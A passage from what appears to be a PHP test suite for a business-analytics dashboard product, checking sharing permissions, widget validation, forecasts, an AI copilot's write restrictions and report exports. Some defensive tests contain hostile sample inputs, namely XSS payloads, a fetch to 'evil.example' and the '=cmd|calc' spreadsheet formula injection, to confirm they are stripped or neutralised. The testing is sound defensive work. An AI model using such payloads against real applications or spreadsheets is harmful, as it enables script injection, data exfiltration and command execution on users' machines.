    $service->share($created['id'], ['subject_type' => 'user', 'subject_id' => RESTRICTED, 'permission' => 'view']);

    // The restricted viewer, in the company where Books refuses them. They must
    // still see the LAYOUT — the point of sharing — and the panel must report
    // the refusal rather than the owner's figure.
    [$viewerAuth, $viewerCtx] = actor(RESTRICTED, 1, 0);

    $shown = (new DashboardService($viewerCtx, $viewerAuth))->find($created['id']);
    assertTrue($shown !== null, 'the shared dashboard opens');
    assertSame('view', $shown['access'], 'with view access');
    assertSame('Net sales', $shown['widgets'][0]['title'], 'and the layout intact');

    // The manage-only fields are withheld from a view-level share.
    assertSame([], $shown['shares'], 'a viewer is not shown the audience list');
});

check('a viewer cannot edit, publish or share a dashboard shared read-only', function (): void {
    [$ownerAuth, $ownerCtx] = actor(OWNER, 1);
    $service = new DashboardService($ownerCtx, $ownerAuth);
    $created = $service->create(['title' => 'Read only board']);
    $service->share($created['id'], ['subject_type' => 'user', 'subject_id' => COLLEAGUE, 'permission' => 'view']);

    [$auth, $ctx] = actor(COLLEAGUE, 1, 0);
    $viewer = new DashboardService($ctx, $auth);

    foreach ([
        'save'    => static fn () => $viewer->save($created['id'], ['revision' => 1, 'title' => 'Hijacked']),
        'publish' => static fn () => $viewer->publish($created['id']),
        'share'   => static fn () => $viewer->share($created['id'], ['subject_type' => 'company', 'permission' => 'view']),
        'delete'  => static fn () => $viewer->delete($created['id']),
    ] as $action => $attempt) {
        try {
            $attempt();
            throw new \RuntimeException($action . ' was allowed on a read-only share');
        } catch (ResponseSent $sent) {
            assertTrue($sent->status === 403 || $sent->status === 404, $action . ' should be refused, got ' . $sent->status);
        }
    }
});

// ===========================================================================

section('Widget schema — the security boundary');

check('SQL, script and URL fields are dropped rather than stored', function (): void {
    actor(OWNER);
    $ctx = Context::of(1, 1, 0);

    $widget = WidgetSchema::widget([
        'widget_type' => 'kpi',
        'title'       => 'Innocent',
        'config'      => [
            'metric_id' => 'finance.net_revenue',
            'sql'       => 'SELECT * FROM insights_dashboards',
            'script'    => '<script>alert(1)</script>',
            'url'       => 'https://evil.example/steal',
            'html'      => '<img src=x onerror=alert(1)>',
            'callback'  => 'fetch("https://evil.example")',
        ],
    ], $ctx);

    foreach (['sql', 'script', 'url', 'html', 'callback'] as $forbidden) {
        assertTrue(!array_key_exists($forbidden, $widget['config']), 'the "' . $forbidden . '" field must not survive validation');
    }
});

check('a widget type or metric that does not exist is refused by name', function (): void {
    actor(OWNER);
    $ctx = Context::of(1, 1, 0);

    try {
        WidgetSchema::widget(['widget_type' => 'iframe', 'title' => 'x', 'config' => []], $ctx);
        throw new \RuntimeException('an invented widget type was accepted');
    } catch (WidgetSchemaError $e) {
        assertSame('widget_type', $e->field, 'the error names the field');
    }

    try {
        WidgetSchema::widget(['widget_type' => 'kpi', 'title' => 'x', 'config' => ['metric_id' => 'finance.made_up']], $ctx);
        throw new \RuntimeException('an invented metric was accepted');
    } catch (WidgetSchemaError $e) {
        assertSame('metric_id', $e->field, 'the error names the field');
    }
});

check('a balance cannot be charted over time', function (): void {
    actor(OWNER);
    $ctx = Context::of(1, 1, 0);

    try {
        WidgetSchema::widget([
            'widget_type' => 'line',
            'title'       => 'Receivables over time',
            'config'      => ['metric_id' => 'finance.receivables', 'grain' => 'month'],
        ], $ctx);
        throw new \RuntimeException('a balance was accepted as a line chart');
    } catch (WidgetSchemaError $e) {
        assertContains('balance at a date', $e->getMessage(), 'and the reason explains why');
    }
});

check('a dimension the metric does not support is refused', function (): void {
    actor(OWNER);
    $ctx = Context::of(1, 1, 0);

    try {
        WidgetSchema::widget([
            'widget_type' => 'ranking',
            'title'       => 'Cash by customer',
            'config'      => ['metric_id' => 'finance.cash_and_bank', 'dimension' => 'customer'],
        ], $ctx);
        throw new \RuntimeException('an unsupported dimension was accepted');
    } catch (WidgetSchemaError $e) {
        assertSame('dimension', $e->field, 'the error names the dimension');
    }
});

// ===========================================================================

section('Templates carry configuration, never figures');

check('no template contains a business figure', function (): void {
    foreach (TemplateCatalog::all() as $template) {
        $encoded = (string) json_encode($template);
        // A template is metric ids, dimensions, grains and coordinates. A long
        // run of digits in one would be a sample amount.
        assertTrue(
            preg_match('/\d{4,}(\.\d+)?/', $encoded) !== 1,
            $template['key'] . ' contains what looks like a sample figure: ' . $encoded,
        );
    }
});

check('every template widget validates against the schema', function (): void {
    actor(OWNER);
    $ctx = Context::of(1, 1, 0);

    foreach (TemplateCatalog::all() as $template) {
        foreach ($template['widgets'] as $index => $widget) {
            try {
                WidgetSchema::widget($widget, $ctx);
            } catch (WidgetSchemaError $e) {
                throw new \RuntimeException($template['key'] . ' widget ' . $index . ' (' . $widget['title'] . ') is invalid: ' . $e->getMessage());
            }
        }
    }
});

check('a template says which panels will not work before it is instantiated', function (): void {
    [$auth, $ctx] = actor(OWNER);

    $response = call([DashboardsController::class, 'templates'], scope());
    $templates = $response->data()['templates'];

    assertTrue(count($templates) >= 6, 'all templates are listed');

    $finance = null;
    foreach ($templates as $template) {
        if ($template['key'] === 'finance_cfo') {
            $finance = $template;
        }
    }
    assertTrue($finance !== null, 'the finance template is present');
    assertTrue($finance['requirements']['products'] !== [], 'it declares which products it needs');
});

// ===========================================================================

section('Overview, forecasts and exceptions');

check('the overview describes what changed, never why', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new OverviewService($ctx, $auth, new QueryService($auth, $ctx));

    $overview = $service->build(Period::forDates('2026-01-01', '2026-01-31'));

    assertSame(4, count($overview['headline']), 'the KPI row is built');
    assertTrue($overview['observations'] !== [], 'observations are produced');
    assertTrue($overview['sources'] !== [], 'and the sources that answered are listed');

    foreach ($overview['observations'] as $observation) {
        assertContains('not why', $observation['basis'], 'every observation says it describes what changed, not why');
    }
});

check('the overview calls out what it could not read rather than showing zeros', function (): void {
    [$auth, $ctx] = actor(OWNER);

    withBooksDown(static function () use ($ctx, $auth): void {
        $service = new OverviewService($ctx, $auth, new QueryService($auth, $ctx));
        $overview = $service->build(Period::forDates('2026-01-01', '2026-01-31'));

        $unavailable = array_values(array_filter($overview['observations'], static fn (array $o) => $o['tone'] === 'unavailable'));
        assertTrue($unavailable !== [], 'the figures that could not be read are called out');
        assertContains('rather than as zero', (string) $unavailable[0]['detail'], 'and the wording is explicit about it');

        foreach ($overview['headline'] as $metric) {
            if ($metric['metric_id'] === 'finance.net_revenue') {
                assertSame(null, $metric['value'], 'an unreadable headline figure has no value');
                assertSame('Unavailable', $metric['formatted'], 'and does not render as a number');
            }
        }
    });
});

check('a forecast refuses a balance and explains why', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new ForecastService($ctx, $auth, new QueryService($auth, $ctx));

    $answer = $service->forMetric('finance.receivables', Period::forDates('2026-01-01', '2026-01-31'), 'linear_trend', 3, null);

    assertSame('unavailable', $answer['payload']['status'], 'a balance is not forecast');
    assertContains('balance at a date', (string) $answer['payload']['message'], 'and the reason is stated');
});

check('a forecast states its method and assumption and never a confidence score', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new ForecastService($ctx, $auth, new QueryService($auth, $ctx));

    $answer = $service->forMetric('finance.net_revenue', Period::forDates('2025-04-01', '2026-01-31'), 'moving_average', 3, null);
    $payload = $answer['payload'];

    if ($payload['status'] === 'ok') {
        assertTrue($payload['method']['assumption'] !== '', 'the assumption is stated');
        assertSame(3, count($payload['projection']), 'the horizon is honoured');
        $encoded = (string) json_encode($payload);
        foreach (['confidence', 'probability', 'likelihood'] as $forbidden) {
            assertTrue(!str_contains(strtolower($encoded), $forbidden), 'a forecast must not claim ' . $forbidden);
        }
    } else {
        // Not enough history from the stub is a legitimate answer, and it must
        // say how much is needed.
        assertContains('history', (string) $payload['message'], 'a refusal explains the history requirement');
    }
});

check('a scenario is labelled a scenario, not a prediction interval', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new ForecastService($ctx, $auth, new QueryService($auth, $ctx));

    $answer = $service->forMetric('finance.collections', Period::forDates('2025-04-01', '2026-01-31'), 'moving_average', 3, '10');
    $payload = $answer['payload'];

    if ($payload['status'] === 'ok') {
        assertTrue($payload['scenario'] !== null, 'the scenario is reported');
        assertContains('not a prediction interval', (string) $payload['scenario']['note'], 'and is explicitly not a confidence band');
    }
});

check('an exception carries its rule, baseline, evidence and severity reason', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new AnomalyService($ctx, $auth, new QueryService($auth, $ctx));

    $found = $service->detect(Period::forDates('2026-01-01', '2026-01-31'));

    foreach ($found['exceptions'] as $exception) {
        assertTrue($exception['rule'] !== '', 'the rule is named');
        assertTrue($exception['severity_reason'] !== '', 'the severity is justified');
        assertTrue($exception['evidence'] !== [], 'the evidence is attached');
        assertTrue(!str_contains(strtolower((string) json_encode($exception)), 'fraud'), 'nothing is called fraud');
    }
});

check('a dismissal needs a reason, and the review survives', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new AnomalyService($ctx, $auth, new QueryService($auth, $ctx));
    $fingerprint = hash('sha256', 'test-exception');

    try {
        $service->review($fingerprint, ['status' => 'dismissed', 'reason' => '']);
        throw new \RuntimeException('a dismissal with no reason was accepted');
    } catch (ResponseSent $sent) {
        assertSame(422, $sent->status, 'a reason is required');
    }

    $reviewed = $service->review($fingerprint, ['status' => 'dismissed', 'reason' => 'Known seasonal dip.', 'rule_id' => 'revenue_drop']);
    assertSame('dismissed', $reviewed['status'], 'the dismissal is recorded');

    $reopened = $service->review($fingerprint, ['status' => 'open']);
    assertSame('open', $reopened['status'], 'and it can be reopened');
});

// ===========================================================================

section('AI — grounded, scoped, and unable to write');

check('Ask Insights answers from figures without a model configured', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $copilot = new Copilot($ctx, $auth, new QueryService($auth, $ctx));

    $answer = $copilot->ask('How are sales doing?', Period::forDates('2026-01-01', '2026-01-31'));

    assertSame('answer', $answer['kind'], 'it answers');
    assertSame('rules', $answer['generated_by'], 'without a model, the answer is rules-based');
    assertTrue($answer['findings'] !== [], 'and it still has findings');
    assertContains('12,50,000.55', (string) $answer['narrative'], 'quoting the real figure, in full');
});

check('a dashboard proposal is valid configuration and is not applied', function (): void {
    [$auth, $ctx] = actor(OWNER);

    $response = call([AiController::class, 'ask'], scope(), [
        'question' => 'Create a dashboard for overdue collections and stock ageing',
    ] + scope());

    $answer = $response->data();
    assertSame('proposal', $answer['kind'], 'a creation request produces a proposal');
    assertTrue($answer['widgets'] !== [], 'with widgets');
    assertContains('nothing has changed', strtolower((string) $answer['apply_note']), 'and it says nothing has been created');

    // Every proposed widget is schema-valid, because it went through the same
    // validator a hand-written request does.
    foreach ($answer['widgets'] as $widget) {
        assertTrue(isset(WidgetSchema::TYPES[$widget['widget_type']]), 'every proposed widget has a real type');
    }

    // Nothing was written to the dashboards table by asking.
    $count = (int) Db::scalar('SELECT COUNT(*) FROM insights_dashboards WHERE cmp_id = 1 AND title LIKE :t', ['t' => '%overdue%']);
    assertSame(0, $count, 'asking creates nothing');
});

check('a proposal can only be applied by the person who asked, and only once', function (): void {
    [$auth, $ctx] = actor(OWNER);

    $asked = call([AiController::class, 'ask'], scope(), ['question' => 'Build me a sales dashboard'] + scope())->data();
    $proposalId = $asked['proposal_id'];
    assertTrue($proposalId !== null, 'the proposal was stored');

    // Somebody else cannot apply it, even holding the permission to ask.
    grant(COLLEAGUE, ['ai.use', 'dashboard.create']);
    actor(COLLEAGUE, 1, 0);
    $refused = call([AiController::class, 'apply'], scope(), scope(), [$proposalId]);
    assertSame(404, $refused->status, 'another person cannot apply somebody else\'s proposal');

    // The author can, once.
    actor(OWNER);
    $applied = call([AiController::class, 'apply'], scope(), scope(), [$proposalId]);
    assertSame(201, $applied->status, 'the author applies it');

    $again = call([AiController::class, 'apply'], scope(), scope(), [$proposalId]);
    assertSame(404, $again->status, 'and it cannot be applied twice');
});

check('the AI surface has no write path into another product', function (): void {
    // Structural, not behavioural: the clients Insights holds for other
    // products must expose no method that could change anything over there.
    foreach (['BooksClient', 'InventoryClient', 'ManageClient', 'OperationalClient'] as $client) {
        $reflection = new \ReflectionClass('Aicountly\\Api\\Clients\\' . $client);
        foreach ($reflection->getMethods(\ReflectionMethod::IS_PUBLIC) as $method) {
            $source = file_get_contents((string) $reflection->getFileName());
            assertTrue(
                !preg_match('/\$this->(request|call|read)\(\s*[\'"](POST|PUT|DELETE|PATCH)/i', (string) $source),
                $client . ' contains a write call. Insights reads; it must not be able to post a voucher or change a master.',
            );
        }
    }
});

// ===========================================================================

section('Reports and exports');

check('an export carries its scope, period and definitions', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new ReportService($ctx, $auth, new QueryService($auth, $ctx));

    $report = $service->run([
        'title'   => 'Monthly review',
        'metrics' => ['finance.net_revenue', 'finance.collections'],
    ], Period::forDates('2026-01-01', '2026-01-31'));

    $file = $service->export($report, 'csv');
    $csv = $file['bytes'];

    assertContains('Test Trading Co 1', $csv, 'the company name is on the file');
    assertContains('Period:', $csv, 'the period is on the file');
    assertContains('Generated:', $csv, 'the generation time is on the file');
    assertContains('Source Smart Books:', $csv, 'source freshness is on the file');
    assertContains('1250000.55', $csv, 'the figure is a plain decimal that will sum');
});

check('a CSV neutralises a formula in a label but not a negative number', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new ReportService($ctx, $auth, new QueryService($auth, $ctx));

    // The stub returns a customer literally called "=cmd|calc".
    $report = $service->run([
        'title'     => 'By customer',
        'metrics'   => ['finance.net_revenue'],
        'dimension' => 'customer',
    ], Period::forDates('2026-01-01', '2026-01-31'));

    $csv = $service->export($report, 'csv')['bytes'];

    assertContains("'=cmd|calc", $csv, 'a label beginning = is prefixed so Excel does not execute it');
    assertTrue(!str_contains($csv, ",=cmd|calc"), 'and the raw form does not appear unquoted');
});

check('an XLSX writes numbers as numbers and quotes a dangerous label', function (): void {
    $writer = new XlsxWriter('Test');
    $writer->addHeader(['Customer', 'Amount']);
    $writer->addRow([
        ['value' => '=cmd|calc', 'type' => 'text'],
        ['value' => '1250000.55', 'type' => 'currency'],
    ]);
    $writer->addRow([
        ['value' => 'Refund', 'type' => 'text'],
        ['value' => '-45000.75', 'type' => 'currency'],
    ]);

    $bytes = $writer->build();
    assertTrue(strlen($bytes) > 500, 'the workbook has content');
    assertSame("PK", substr($bytes, 0, 2), 'it is a zip');

    $path = tempnam(sys_get_temp_dir(), 'xlsxtest');
    file_put_contents($path, $bytes);
    $zip = new \ZipArchive();
    $zip->open($path);
    $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
    $strings = (string) $zip->getFromName('xl/sharedStrings.xml');
    $zip->close();
    @unlink($path);

    assertContains('<v>1250000.55</v>', $sheet, 'the amount is a numeric cell, so it will sum');
    assertContains('<v>-45000.75</v>', $sheet, 'a negative amount keeps its sign and stays numeric');
    assertContains("'=cmd|calc", $strings, 'the dangerous label is neutralised in the shared string table');
});

check('a PDF renders with the scope on the page', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new ReportService($ctx, $auth, new QueryService($auth, $ctx));

    $report = $service->run(['title' => 'Board pack', 'metrics' => ['finance.net_revenue']], Period::forDates('2026-01-01', '2026-01-31'));
    $pdf = $service->export($report, 'pdf')['bytes'];

    assertSame('%PDF', substr($pdf, 0, 4), 'it is a PDF');
    assertTrue(strlen($pdf) > 1000, 'with content');
    assertContains('Test Trading Co 1', $pdf, 'and the company name on the page');
});

check('an export runs the same query as the screen, under the same permissions', function (): void {
    // Somebody who MAY export in Insights, in the company where Books refuses
    // them. The export must run — they hold report.export — and must contain no
    // figure they could not see on screen.
    grant(COLLEAGUE, ['report.view', 'report.export'], 77);
    actor(COLLEAGUE, 77, 0);

    $response = call([ReportsController::class, 'export'], scope(77) + ['format' => 'csv'], [
        'config' => ['metrics' => ['finance.net_revenue']],
        'title'  => 'Attempted export',
    ] + scope(77));

    assertSame(200, $response->status, 'the export runs');
    $csv = base64_decode((string) $response->data()['body']);
    assertTrue(!str_contains($csv, '1250000'), 'and contains no figure the viewer could not see');
    assertContains('denied', $csv, 'and records the refusal instead');
});

// ===========================================================================

section('Data sources — honest about what is and is not working');

check('every source reports configured, reachable and permitted separately', function (): void {
    [$auth, $ctx] = actor(OWNER);

    $response = call([SourcesController::class, 'index'], scope());
    $data = $response->data();

    assertTrue(count($data['sources']) >= 2, 'Books and Inventory are listed');

    foreach ($data['sources'] as $source) {
        foreach (['configured', 'reachable', 'permitted', 'status', 'checked_at'] as $field) {
            assertTrue(array_key_exists($field, $source), $source['product'] . ' is missing "' . $field . '"');
        }
    }

    // The metrics with no binding at all are named, so the gap is explicable.
    $unbound = array_column($data['unbound_metrics'], 'metric_id');
    assertTrue(in_array('finance.cogs', $unbound, true), 'COGS is declared unbound rather than silently missing');
});

echo "\n" . str_repeat('-', 60) . "\n";
echo sprintf("%d passed, %d failed\n", $passed, $failed);

exit($failed === 0 ? 0 : 1);
